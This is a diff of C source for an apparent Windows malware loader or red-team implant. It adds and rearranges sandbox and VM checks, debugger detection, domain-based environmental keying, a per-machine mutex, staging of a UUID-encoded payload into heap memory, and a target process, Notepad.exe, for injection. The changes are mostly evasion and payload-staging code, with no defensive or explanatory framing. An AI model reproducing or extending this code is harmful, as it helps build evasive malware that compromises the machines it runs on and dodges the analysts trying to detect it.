@@ -54,49 +54,12 @@ typedef BOOL       (WINAPI* _tSetProcessMitigationPolicy)( PROCESS_MITIGATION_PO
 typedef HANDLE     (WINAPI* _HeapCreate)(DWORD ,SIZE_T ,SIZE_T);
 typedef LPVOID     (WINAPI* _HeapAlloc)(HANDLE ,DWORD ,SIZE_T);
 typedef RPC_STATUS (RPC_ENTRY* _UuidtoString)(RPC_CSTR ,UUID* );
+typedef BOOL       (WINAPI* _EnumDisplayDevicesA)(LPSTR, DWORD, REAL_DISPLAY_DEVICE*, DWORD);
 
 // ntdll.dll exports
 typedef NTSTATUS (NTAPI* _tNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
 
-// Other internal function declarations
-
-VOID    PreChecks();
-VOID    EnvChecks();
-VOID    AmIDebugged();
-CHAR*   GetDynamicMutex();
-PWSTR   ReadEnvValue(PWSTR);
-FARPROC GetFuncAddr(PVOID, DWORD);
-DWORD   compute_hash(const void*, UINT32);
-
-
-
-// Struct Defenitions
-
-typedef uint64_t* PQWORD;
-
-enum SYSTEM_INFORMATION_CLASS {
-	SystemExtendedProcessInformation = 57
-};
-
-typedef struct _UNICODE_STRING {
-	USHORT Length;
-	USHORT MaximumLength;
-	PWSTR  Buffer;
-} UNICODE_STRING;
-
-typedef struct _SYSTEM_PROCESS_INFO
-{
-	ULONG                   NextEntryOffset;
-	ULONG                   NumberOfThreads;
-	LARGE_INTEGER           Reserved[3];
-	LARGE_INTEGER           CreateTime;
-	LARGE_INTEGER           UserTime;
-	LARGE_INTEGER           KernelTime;
-	UNICODE_STRING          ImageName;
-	ULONG                   BasePriority;
-	HANDLE                  ProcessId;
-	HANDLE                  InheritedFromProcessId;
-}SYSTEM_PROCESS_INFO, * PSYSTEM_PROCESS_INFO;
+ 
 
 void handleError(char* ErrMsg) {
 	// Function to handle errors properly
@@ -224,7 +187,7 @@ DWORD dllpolicy() {
 
 
 
-void EnvChecks() {
+BOOL EnvChecks() {
 	
 	WCHAR userdomain[]   = { 'U','S','E','R','D','O','M','A','I','N',0 };
 	WCHAR logonserver[]  = { 'L','O','G','O','N','S','E','R','V','E','R',0 };
@@ -232,11 +195,12 @@ void EnvChecks() {
 	
 	// Get Logon Server , I.e Hostname or DC Name
 	 computer = ReadEnvValue(logonserver);
-	 printf("DC: %ws\n", computer);
+	// printf("DC: %ws\n", computer);
 
 	//Get AD Domain Name Joined
 	 domain = ReadEnvValue(userdomain);
-	 printf("USERDOMAIN: %ws\n", domain);
+	
+	 //printf("USERDOMAIN: %ws\n", domain);
 
 	/*
 	//Get DNS Server of Connected Domain
@@ -247,41 +211,26 @@ void EnvChecks() {
 	 if (compute_hash(domain, 0) == DomainHash)
 	 {
 		 printf("Domain Match, Environment Good\n");
+		 return TRUE;
 	
 	 }
 	 
-	 printf("%p, %p", compute_hash(domain, 0), DomainHash);
+	// printf("%p, %p", compute_hash(domain, 0), DomainHash);
 	
 	 // Change to Hash Compare, Hardcoding not good
 	/* if (wcscmp(domain, _DOMAIN) == 0) {
 		printf("Match\n");
 	}
 	*/
+
+	 return FALSE;
 }
 
 void AmIDebugged() {
 	void* isb = 0;
 	if (IsDbgPresent()) { printf("\nDebugger present  %d\n", IsDbgPresent()); }
-	printf("\nNo Debugger  %d\n", IsDbgPresent());
+	// printf("\nNo Debugger  %d\n", IsDbgPresent());
 }
-
-typedef struct _REAL_DISPLAY_DEVICE
-{
-	DWORD cb;
-	TCHAR DeviceName[32];
-	TCHAR DeviceString[128];
-	DWORD StateFlags;
-	TCHAR DeviceID[128];
-	TCHAR DeviceKey[128];
-} REAL_DISPLAY_DEVICE;
-
-
-BOOL(WINAPI* _EnumDisplayDevicesA)(
-	LPSTR lpDevice,                // device name
-	DWORD iDevNum,                   // display device
-	REAL_DISPLAY_DEVICE* DisplayDevice, // device information
-	DWORD dwFlags                    // reserved
-	) = NULL;
 
 
 BOOL checkvm() {
@@ -512,16 +461,22 @@ int wmain() {
 	// Dynamic mutex lock based on osproductcontentid
 	// Unique mutex names on each PC
 
-	 char mutexe[80];
-	 strcpy_s(mutexe, 80 , GetDynamicMutex()); 
+	 
+	 // Environmental Keying 
+//	if (!EnvChecks()) { printf("Not a Domain Machine... Exiting\n"); return; }
+    	
+	if (!checkvm()) { printf("Inside a VM... Exiting\n"); return; }
 
-	 // First thing to check is Mutex lock
-	if (!MutexCheck(mutexe)) { printf("Mutex Exists\n");  return; }
+	char mutexe[80];
+	strcpy_s(mutexe, 80, GetDynamicMutex());
 
-	_getch();
+
+	// First thing to check is Mutex lock
+	if (!MutexCheck(mutexe)) { printf("Mutex Exists... Exiting\n");  return; }
+
+	void* isb = 0;
+	if (IsDbgPresent()) { printf("\nBeing Debugged... Exiting\n"); }
 	
-	if (!checkvm()) { printf("In VM Exiting\n"); return; }
-
 
 	// Target Process to Inject into
 	WCHAR procname[] = { 'N','o','t','e','p', 'a', 'd', '.', 'e','x','e', 0 };
@@ -568,11 +523,15 @@ int wmain() {
 
 	
 	for (int i = 0; i < elems; i++) {
+
+		// Experiments and replace with GUID function later ?
+		// StringFromGUID 	
 		RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);
 		if (status != RPC_S_OK) { CloseHandle(ha);return -1;}
 		hptr += 16;
 	}
 
+	printf("dekho\n");
 	printf("[*] Hexdumpss: ");
 	for (int i = 0; i < elems * 16; i++) {
 		printf("%02X ", ((unsigned char*)ha)[i]);
